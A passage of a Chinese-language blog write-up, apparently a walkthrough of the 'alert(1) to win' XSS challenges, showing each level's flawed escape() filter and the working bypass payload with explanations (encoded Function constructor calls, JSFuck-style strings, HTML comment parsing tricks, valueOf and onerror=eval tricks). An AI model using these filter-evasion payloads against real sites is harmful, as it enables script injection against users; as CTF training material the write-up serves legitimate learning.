language-js","children":["[][",["$","span",null,{"className":"hljs-string","children":"\"sort\""}],"][",["$","span",null,{"className":"hljs-string","children":"\"constructor\""}],"](",["$","span",null,{"className":"hljs-string","children":"\"alert(1)\""}],")()\n"]}]}],"\n",["$","p",null,{"children":["这个关键在于",["$","code",null,{"children":"Function(\"code\")"}],"。它可以将字符串作为参数传进去，返回一个以传进去的字符串为函数体的匿名函数。所以这个函数可以让你将字符串当作代码来执行。我们可以通过",["$","code",null,{"children":"[]['sort']['constructor']"}],"来获得这个函数。\n",["$","img",null,{"src":"/images/3.png","alt":""}],"\n顺便简单说一下，",["$","code",null,{"children":"[]"}],"定义了一个空数组，数组自带了很多方法，",["$","code",null,{"children":"sort"}],"是其中一个，还有很多方法，随便用一个都行，这里就用了sort。",["$","code",null,{"children":"[][\"sort\"]"}],"的效果相当于",["$","code",null,{"children":"[].sort"}],"。\n所有payload可以改为",["$","code",null,{"children":"\"+[][\"sort\"][\"constructor\"](\"alert(1)\")())+\""}],"\n此时又多了一个新的问题，用什么来代替上面的三个字符串呢？\n这时候就可以用题目Template中用到的方法了，用八进制来代替字母。\n所以答案就出来了：\nsolution(99): ",["$","code",null,{"children":"\"+[][\"\\160\\157\\160\"][\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"]('\\141\\154\\145\\162\\164(1)')()+\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"iframe","children":"iframe"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," tag = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'iframe'"}],");\n\n  ",["$","span",null,{"className":"hljs-comment","children":"// For this one, you get to run any code you want, but in a \"sandboxed\" iframe."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"//"}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// https://4i.am/?...raw=... just outputs whatever you pass in."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"//"}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// Alerting from 4i.am won't count."}],"\n\n  s = ",["$","span",null,{"className":"hljs-string","children":"'<script>'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'<\\/script>'"}],";\n  tag.",["$","span",null,{"className":"hljs-property","children":"src"}]," = ",["$","span",null,{"className":"hljs-string","children":"'https://4i.am/?:XSS=0&CT=text/html&raw='"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"encodeURIComponent"}],"(s);\n\n  ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"WINNING"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params"}],") { youWon = ",["$","span",null,{"className":"hljs-literal","children":"true"}],"; };\n\n  tag.",["$","span",null,{"className":"hljs-title function_","children":"setAttribute"}],"(",["$","span",null,{"className":"hljs-string","children":"'onload'"}],", ",["$","span",null,{"className":"hljs-string","children":"'youWon && alert(1)'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," tag.",["$","span",null,{"className":"hljs-property","children":"outerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题其实也挺好玩的，如果比较熟悉iframe的特性的话，其实也很简单很快就做出来了，但是如果不知道的话，那就挺花时间的了。\n这题关键在于使得",["$","code",null,{"children":"youWon"}],"这个变量的值为true，然后就可以触发alert(1)了。首先看一下我们注入的地方是一个URL，题目有说，这个url页面返回的页面就是我们输入的内容。也就是说iframe的内容是由我们决定的。\n我们的输入会包裹在一个",["$","code",null,{"children":"script"}],"标签里面。\n要做出这道题，我们要知道两点iframe的特性"]}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":"iframe的name属性值，同时会注入到父页面的全局窗口对象中。"}],"\n",["$","li",null,{"children":"iframe的name属性，则iframe的window.name的值同时会设置为这个name属性值。反过来也是一样的，不过有个前提时iframe并没有设置name属性。也就是说如果设置了iframe的window.name，同时也会将iframe的name属性值设置为同样的值（前提是它不存在的话，不能被覆盖）"}],"\n"]}],"\n",["$","p",null,{"children":["所以，答案出来了。\nsolution(13)： ",["$","code",null,{"children":"name='youWon'"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"tism","children":"TI(S)M"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"json"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") { ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\/'"}],"); }\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"html"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") { ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[<>\"&]/g"}],", ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n                        ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'&#'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"charCodeAt"}],"(",["$","span",null,{"className":"hljs-number","children":"0"}],") + ",["$","span",null,{"className":"hljs-string","children":"';'"}],"; }); }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," (\n    ",["$","span",null,{"className":"hljs-string","children":"'<script>'"}]," +\n      ",["$","span",null,{"className":"hljs-string","children":"'var url = '"}]," + ",["$","span",null,{"className":"hljs-title function_","children":"json"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"'; // We\\'ll use this later '"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'</script>\\n\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  <!-- for debugging -->\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  URL: '"}]," + ",["$","span",null,{"className":"hljs-title function_","children":"html"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"'\\n\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'<!-- then suddenly -->\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'<script>\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  if (!/^http:.*/.test(url)) console.log(\"Bad url: \" + url);\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  else new Image().src = url;\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'</script>'"}],"\n  );\n}\n"]}]}],"\n",["$","p",null,{"children":["这题思路也是由刚刚那个博主提供的。原理我暂时也不是很清楚。大概意思就是在HTML5中如果遇到",["$","code",null,{"children":"<!--<script>"}],"，就会认为接下的代码是JS代码，直到遇到结束的",["$","code",null,{"children":"script"}],"标签，但是必须得保证有相应的",["$","code",null,{"children":"->"}],"，否则会认为语法出错的。\n具体的内容可以到刚刚那个博主里看吧，我就直接给出答案了。\nsolution(25): ",["$","code",null,{"children":"if(alert(1)/*<!--<script>"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"json-ⅲ","children":"JSON Ⅲ"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-string","children":"'#'"}],").",["$","span",null,{"className":"hljs-title function_","children":"map"}],"(",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"v"}],") {\n      ",["$","span",null,{"className":"hljs-comment","children":"// Only 20% of slashes are end tags; save 1.2% of total"}],"\n      ",["$","span",null,{"className":"hljs-comment","children":"// bytes by only escaping those."}],"\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(v).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/<\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<\\\\/'"}],");\n      ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}],"+json+",["$","span",null,{"className":"hljs-string","children":"')</script>'"}],";\n      }).",["$","span",null,{"className":"hljs-title function_","children":"join"}],"(",["$","span",null,{"className":"hljs-string","children":"''"}],");\n}\n"]}]}],"\n",["$","p",null,{"children":["利用上一题的办法就可以做出来了。\nsolution(29): ",["$","code",null,{"children":"<!--<script>#)/;alert(1)//-->"}],"\n分析一下这个答案。\n输入这个答案，会输入如下结果："]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["<script>",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"<!--<script>\""}],")<",["$","span",null,{"className":"hljs-regexp","children":"/script><script>console.log(\")/"}],";",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-comment","children":"//-->\")</script>"}],"\n"]}]}],"\n",["$","p",null,{"children":["因为我们注入了",["$","code",null,{"children":"<!--<script>"}],"，导致parser将这一段都当作JS来处理。"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"<!--<script>\""}],")<",["$","span",null,{"className":"hljs-regexp","children":"/script><script>console.log(\")/"}],";",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-comment","children":"//-->\")"}],"\n"]}]}],"\n",["$","p",null,{"children":"js引擎会解析成如下的样子："}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"\nconsole.log(\"junk_string\") < /junk_regexp/ ; alert(1) // -->\n"}]}],"\n",["$","p",null,{"children":["其中\njunk_string代表： ",["$","code",null,{"children":"<!--<script>"}],"\njunk_regexp代表： ",["$","code",null,{"children":"script><script>console.log(\"\")"}],"\n我们的solution中注入的其中两个字符",["$","code",null,{"children":")/"}],"就为了欺骗JS引擎，JS引擎会将两个斜杠之间的内容当作正则表达式处理，用这个办法来闭合掉这些多余的字符。"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia-ⅲ","children":"Skandia Ⅲ"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/[\\\\<>]/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(s)) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'-'"}],";\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"toUpperCase"}],"() + ",["$","span",null,{"className":"hljs-string","children":"'\")</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题和上一题",["$","code",null,{"children":"Skandia ]["}],"差不多的做法。不过因为过滤多了一个反斜杆，所以不能用八进制来代替了。那就要换一种思路。\n先来看看下面的表格。\n",["$","img",null,{"src":"/images/1.png","alt":""}],"\n这里的表格是说，左边的输入是可以返回右边的字符串的。大家可以在试试。\n所以可以用这个办法来获取我们需要的字符串\n",["$","img",null,{"src":"/images/2.png","alt":""}],"\n所以最后的payload(246):"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-string","children":"\"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+\""}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-string","children":"\")())//`\n"}]]}]}],"\n",["$","p",null,{"children":"如果把我们所需要的字母都赋给一个变量，那么这个payload可以更短一些"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["_=",["$","span",null,{"className":"hljs-string","children":"''"}],"+!",["$","span",null,{"className":"hljs-number","children":"1"}],"+!",["$","span",null,{"className":"hljs-number","children":"0"}],"+{}[",["$","span",null,{"className":"hljs-number","children":"0"}],"]+{}  ",["$","span",null,{"className":"hljs-comment","children":"//_=\"falsetrueundefined[object Object]\""}],"\n"]}]}],"\n",["$","p",null,{"children":"所以payload可以缩短成144个字符："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["$","span",null,{"className":"hljs-string","children":"\");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//\n"}]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"rfc4627","children":"RFC4627"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"text"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i = ",["$","span",null,{"className":"hljs-number","children":"0"}],";\n  ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"the_easy_but_expensive_way_out"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params"}],") { ",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(i++) };\n\n",["$","span",null,{"className":"hljs-comment","children":"// \"A JSON text can be safely passed into JavaScript's eval() function"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// (which compiles and executes a string) if all the characters not"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// enclosed in strings are in the set of characters that form JSON"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// tokens.\""}],"\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!(",["$","span",null,{"className":"hljs-regexp","children":"/[^,:{}\\[\\]0-9.\\-+Eaeflnr-u \\n\\r\\t]/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(\n          text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"(\\\\.|[^\"\\\\])*\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],")))) {\n    ",["$","span",null,{"className":"hljs-keyword","children":"try"}]," {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," val = ",["$","span",null,{"className":"hljs-built_in","children":"eval"}],"(",["$","span",null,{"className":"hljs-string","children":"'('"}]," + text + ",["$","span",null,{"className":"hljs-string","children":"')'"}],");\n      ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"''"}]," + val);\n    } ",["$","span",null,{"className":"hljs-keyword","children":"catch"}]," (_) {\n      ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"'Crashed: '"}],"+_);\n    }\n  } ",["$","span",null,{"className":"hljs-keyword","children":"else"}]," {\n    ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"'Rejected.'"}],");\n  }\n}\n"]}]}],"\n",["$","p",null,{"children":["据说这题是基于真实的案例，",["$","a",null,{"href":"https://twitter.com/WisecWisec","children":"Stefano Di Paola"}],"记载在这篇",["$","a",null,{"href":"http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html","children":"文章"}],"中。\n仔细看一下这个表达式，它是允许我们输入",["$","code",null,{"children":"self"}],"的，如果是这样的话，我们就可以通过它来调用全局函数",["$","code",null,{"children":"the_easy_but_expensive_way_out"}],"了。\n这题的技巧就是让一个对象和一个值或者一个字符相加。这样JS引擎就会去计算我们的对象的值，怎么计算呢？就是调用这个对象的",["$","code",null,{"children":"valueOf"}],"方法，如果我们将valueOf方法定义为题目中的",["$","code",null,{"children":"the_easy_but_expenssive_way_out"}],"，，就可以触发alert函数了，但是由于是alert(i++)，i从0开始，所以我们要调用两次。\nsolution(103): ",["$","code",null,{"children":"{\"valueOf\":self[\"the_easy_but_expensive_way_out\"]}+0,{\"valueOf\":self[\"the_easy_but_expensive_way_out\"]}"}],"\n需要提醒的是，第一次是由",["$","code",null,{"children":"eval"}],"调用，第二次是由",["$","code",null,{"children":"console.log"}],"调用。"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"brunn","children":"Brunn"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-attr","children":"http"}],":",["$","span",null,{"className":"hljs-comment","children":"//www.avlidienbrunn.se/xsschallenge/"}],"\n\n  s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[\\r\\n\\u2028\\u2029\\\\;,()\\[\\]<]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script> var email = '\""}]," + s + ",["$","span",null,{"className":"hljs-string","children":"\"'; <\\/script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["分号尖括号都被过滤掉了，所以普通的办法是无效的。但是上一题的方法还是有用。\n所以应该构造的payload是：\n",["$","code",null,{"children":"'+{valueOf:Function('alert(1)')}//"}],"\n或者",["$","code",null,{"children":"'+{valueOf:function(){alert(1)}}//"}],"\n或者",["$","code",null,{"children":"'+{valueOf:()=>{alert(1)}}//"}],"\n或者",["$","code",null,{"children":"'+{valueOf:a=>{alert(1)}}//"}],"\n但是有新的一个问题就是不能使用小括号和中括号。\n对于这个问题，可以用",["$","a",null,{"href":"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals","children":"Tag Function"}],"来解决这个问题。\nsolution(85):"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-string","children":"'+{valueOf:Function`a${'"}],"alert",["$","span",null,{"className":"hljs-string","children":"'+String.fromCharCode`40`+1+String.fromCharCode`41`}`}//\n"}]]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"no","children":"No"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[()`<]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],"); ",["$","span",null,{"className":"hljs-comment","children":"// no function calls"}],"\n\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'var string = \"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\";\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'console.log(string);\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["参考资料：",["$","a",null,{"href":"http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/","children":"XSS technique without parentheses"}],"\nsolution(39): ",["$","code",null,{"children":"\";onerror=eval;throw'=alert\\x281\\x29'//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels in honor of K'Z'K the Destroyer"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这个题要用的办法还是和题目一样Skandia ][]，但是不用全部都用八进制来替换，只要替换掉元音字母就可以了。\nsolution(60):  ",["$","code",null,{"children":"\",[][\"p\\x6fp\"][\"c\\x6fnstr\\x75ct\\x6fr\"]('\\x61l\\x65rt(1)')(),\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk-1","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels and escape sequences in honor of K'Z'K"}],"\n    ",["$","span",null,{"className":"hljs-comment","children":"// y is only sometimes a vowel, so it's only removed as a literal"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]|\\\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],")\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove certain characters that can be used to get vowels"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[{}!=<>]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题有个正则替换，将我们的八进制或者十六进制都给替换成空了，但是我们可以结合上一题的做法和题目JSON ][的方法就可以了。\nsolution(85): ",["$","code",null,{"children":"\");[][\"p\\x\\x6f6fp\"][\"c\\x\\x6f6fnstr\\x\\x7575ct\\x\\x6f6fr\"]('\\x\\x6161l\\x\\x6565rt(1)')()//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk-2","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels in honor of K'Z'K the Destroyer"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove certain characters that can be used to get vowels"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[{}!=<>\\\\]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"这题复杂一点，没想到好办法。所以还是用老办法。\nsolution(190):"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["$","span",null,{"className":"hljs-string","children":"\");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//\n"}]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-1","children":"Fruit 1"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-string","children":"'SCRIPT'"}]," === n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],") n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = 